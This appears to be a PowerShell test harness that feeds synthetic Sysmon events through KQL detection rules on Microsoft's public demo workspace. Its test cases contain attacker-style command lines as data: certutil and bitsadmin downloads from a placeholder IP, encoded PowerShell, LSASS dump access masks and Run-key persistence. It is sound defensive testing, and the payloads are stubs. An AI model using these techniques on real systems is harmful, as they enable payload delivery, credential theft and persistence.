<#
.SYNOPSIS
    Replays synthetic Sysmon events through every detection on a real Kusto engine.

.DESCRIPTION
    Each case is one event plus whether the detection must match it. The .kql file runs
    unchanged: a let statement shadows the Event table with that single synthetic row.

    Queries go to Microsoft's public Log Analytics demo workspace, so no Azure account is
    needed. DEMO_KEY is that service's published demo value, not a credential. Only the
    synthetic text in this file and in samples/ leaves the machine.

    This proves the query logic against hand-written events. It does not prove that the
    field extraction matches a live workspace, or anything about false-positive rates.

    Exits 1 if any case fails, including a case that could not be run.

.PARAMETER DetectionDir
    Folder holding the .kql files. Defaults to detections/ beside this script's parent.

.EXAMPLE
    .\tests\Test-Detections.ps1
#>
[CmdletBinding()]
param(
    [string]$DetectionDir
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# $PSScriptRoot is empty inside param() defaults on Windows PowerShell 5.1, so resolve it here.
$repoRoot = Split-Path -Parent $PSScriptRoot
if (-not $DetectionDir) { $DetectionDir = Join-Path $repoRoot 'detections' }
$sampleDir = Join-Path $repoRoot 'samples'
$endpoint = 'https://api.loganalytics.io/v1/workspaces/DEMO_WORKSPACE/query'

function ConvertTo-EventData {
    param([System.Collections.IDictionary]$Fields)
    $items = foreach ($key in $Fields.Keys) {
        $value = [System.Security.SecurityElement]::Escape([string]$Fields[$key])
        '<Data Name="{0}">{1}</Data>' -f $key, $value
    }
    '<EventData xmlns="http://schemas.microsoft.com/win/2004/08/events/event">' + ($items -join '') + '</EventData>'
}

function New-Case {
    param(
        [string]$Detection,
        [string]$Name,
        [bool]$Match,
        [int]$EventId,
        [System.Collections.IDictionary]$Fields
    )
    [pscustomobject]@{
        Detection = $Detection
        Name      = $Name
        Match     = $Match
        EventId   = $EventId
        EventData = ConvertTo-EventData -Fields $Fields
    }
}

function New-ProcessCase {
    param([string]$Detection, [string]$Name, [bool]$Match, [string]$Image, [string]$CommandLine)
    New-Case $Detection $Name $Match 1 ([ordered]@{
            Image       = $Image
            CommandLine = $CommandLine
            User        = 'CONTOSO\user01'
            ParentImage = 'C:\Windows\explorer.exe'
            ProcessGuid = '{00000000-0000-4000-8000-000000000001}'
        })
}

function New-LsassCase {
    param([string]$Name, [bool]$Match, [string]$Access, [string]$Target = 'C:\Windows\System32\lsass.exe')
    New-Case 'lsass-access' $Name $Match 10 ([ordered]@{
            SourceImage   = 'C:\Users\user01\AppData\Local\Temp\not-a-real-tool.exe'
            TargetImage   = $Target
            GrantedAccess = $Access
            SourceUser    = 'CONTOSO\user01'
            TargetUser    = 'NT AUTHORITY\SYSTEM'
            CallTrace     = 'C:\Windows\SYSTEM32\ntdll.dll+0x0|UNKNOWN'
        })
}

function New-RegistryCase {
    param([string]$Name, [bool]$Match, [string]$TargetObject)
    New-Case 'persistence-run-key' $Name $Match 13 ([ordered]@{
            EventType    = 'SetValue'
            Image        = 'C:\Users\user01\AppData\Local\Temp\updater-fake.exe'
            User         = 'CONTOSO\user01'
            TargetObject = $TargetObject
            Details      = 'C:\Users\user01\AppData\Local\Temp\updater-fake.exe'
        })
}

function New-NetworkCase {
    param([string]$Name, [bool]$Match, [string]$Image, [string]$Initiated = 'true')
    New-Case 'script-host-outbound' $Name $Match 3 ([ordered]@{
            Image           = $Image
            User            = 'CONTOSO\user01'
            Protocol        = 'tcp'
            DestinationIp   = '192.0.2.50'
            DestinationPort = '443'
            Initiated       = $Initiated
        })
}

$ps = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
$cases = @(
    New-ProcessCase 'encoded-powershell' 'long form' $true $ps "$ps -NoProfile -EncodedCommand AAAA"
    New-ProcessCase 'encoded-powershell' '-enc' $true $ps 'powershell.exe -enc AAAA'
    New-ProcessCase 'encoded-powershell' '-ec alias' $true $ps 'powershell.exe -ec AAAA'
    New-ProcessCase 'encoded-powershell' '-enco prefix' $true $ps 'powershell.exe -enco AAAA'
    New-ProcessCase 'encoded-powershell' 'slash form' $true $ps 'powershell.exe /enc AAAA'
    New-ProcessCase 'encoded-powershell' 'ExecutionPolicy is not encoded' $false $ps 'powershell.exe -ExecutionPolicy Bypass -File C:\scripts\backup.ps1'
    New-ProcessCase 'encoded-powershell' 'cmd without PowerShell' $false 'C:\Windows\System32\cmd.exe' 'cmd.exe /c echo hello'

    New-ProcessCase 'lolbin-download' 'certutil slash form' $true 'C:\Windows\System32\certutil.exe' 'certutil.exe /urlcache /f http://192.0.2.10/a C:\a'
    New-ProcessCase 'lolbin-download' 'bitsadmin transfer' $true 'C:\Windows\System32\bitsadmin.exe' 'bitsadmin.exe /transfer job https://192.0.2.10/a C:\a'
    New-ProcessCase 'lolbin-download' 'certutil hash check' $false 'C:\Windows\System32\certutil.exe' 'certutil.exe -hashfile C:\a.iso SHA256'

    New-LsassCase 'VM_READ mask' $true '0x1010'
    New-LsassCase 'dump mask' $true '0x1410'
    New-LsassCase 'uppercase mask' $true '0x143A'
    New-LsassCase 'lowercase mask' $true '0x143a'
    New-LsassCase 'PROCESS_ALL_ACCESS, uppercase' $true '0x1FFFFF'
    New-LsassCase 'query-only access cannot read memory' $false '0x1000'
    New-LsassCase 'other target process' $false '0x1FFFFF' 'C:\Windows\explorer.exe'

    New-RegistryCase 'HKU Run key' $true 'HKU\S-1-5-21-0-0-0-1001\Software\Microsoft\Windows\CurrentVersion\Run\Thing'
    New-RegistryCase 'HKLM RunOnce' $true 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Thing'
    New-RegistryCase 'unrelated key' $false 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Thing'

    New-ProcessCase 'process-user-writable-path' 'AppData Temp' $true 'C:\Users\user01\AppData\Local\Temp\x.exe' 'x.exe'
    New-ProcessCase 'process-user-writable-path' 'Users Public' $true 'C:\Users\Public\x.exe' 'x.exe'
    New-ProcessCase 'process-user-writable-path' 'Windows Temp' $true 'C:\Windows\Temp\x.exe' 'x.exe'
    New-ProcessCase 'process-user-writable-path' 'Program Files' $false 'C:\Program Files\Foo\foo.exe' 'foo.exe'
    New-ProcessCase 'process-user-writable-path' 'allowlisted updater' $false 'C:\Users\user01\AppData\Local\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe' 'update'

    New-NetworkCase 'mshta outbound' $true 'C:\Windows\System32\mshta.exe'
    New-NetworkCase 'browser outbound' $false 'C:\Program Files\Foo\browser.exe'
    New-NetworkCase 'inbound to PowerShell' $false $ps 'false'
)

# Every published sample has to fire the detection it illustrates.
$sampleMap = [ordered]@{
    'synthetic-encoded-powershell.json'    = 'encoded-powershell'
    'synthetic-certutil-download.json'     = 'lolbin-download'
    'synthetic-lsass-access.json'          = 'lsass-access'
    'synthetic-run-key.json'               = 'persistence-run-key'
    'synthetic-script-host-outbound.json'  = 'script-host-outbound'
}
foreach ($file in $sampleMap.Keys) {
    $sample = Get-Content -LiteralPath (Join-Path $sampleDir $file) -Raw -Encoding UTF8 | ConvertFrom-Json
    $cases += [pscustomobject]@{
        Detection = $sampleMap[$file]
        Name      = "sample $file"
        Match     = $true
        EventId   = [int]$sample.EventID
        EventData = $sample.EventData
    }
}

function Get-MatchCount {
    param([pscustomobject]$Case, [string]$Query)
    $literal = '@"' + ($Case.EventData -replace '"', '""') + '"'
    $let = 'let Event = datatable(Computer:string, Source:string, EventID:int, EventData:string)' +
    '["PC-01", "Microsoft-Windows-Sysmon", ' + $Case.EventId + ', ' + $literal + ']' +
    ' | extend TimeGenerated = now();'
    $body = @{ query = "$let`n$Query`n| count" } | ConvertTo-Json -Compress
    $response = Invoke-RestMethod -Method Post -Uri $endpoint -Headers @{ 'x-api-key' = 'DEMO_KEY' } `
        -ContentType 'application/json; charset=utf-8' -Body ([Text.Encoding]::UTF8.GetBytes($body))
    [int]$response.tables[0].rows[0][0]
}

$failed = 0
foreach ($group in ($cases | Group-Object Detection)) {
    $path = Join-Path $DetectionDir ($group.Name + '.kql')
    $query = (Get-Content -LiteralPath $path -Raw -Encoding UTF8).TrimEnd()
    Write-Host $group.Name
    foreach ($case in $group.Group) {
        try {
            $count = Get-MatchCount -Case $case -Query $query
            $ok = ($count -gt 0) -eq $case.Match
            $note = "rows=$count"
        } catch {
            $ok = $false
            $note = "ERROR: $($_.Exception.Message)"
        }
        $expected = if ($case.Match) { 'match' } else { 'no match' }
        if (-not $ok) { $failed++ }
        Write-Host ('  {0}  {1,-44} want {2,-8} {3}' -f $(if ($ok) { 'ok  ' } else { 'FAIL' }), $case.Name, $expected, $note)
    }
}

$covered = @($cases | Select-Object -ExpandProperty Detection -Unique).Count
$onDisk = @(Get-ChildItem -LiteralPath $DetectionDir -Filter *.kql).Count
if ($covered -ne $onDisk) {
    Write-Host "FAIL  $onDisk detections on disk but cases cover $covered"
    $failed++
}

Write-Host ''
Write-Host ("{0} cases, {1} failed" -f $cases.Count, $failed)
if ($failed -gt 0) { exit 1 }
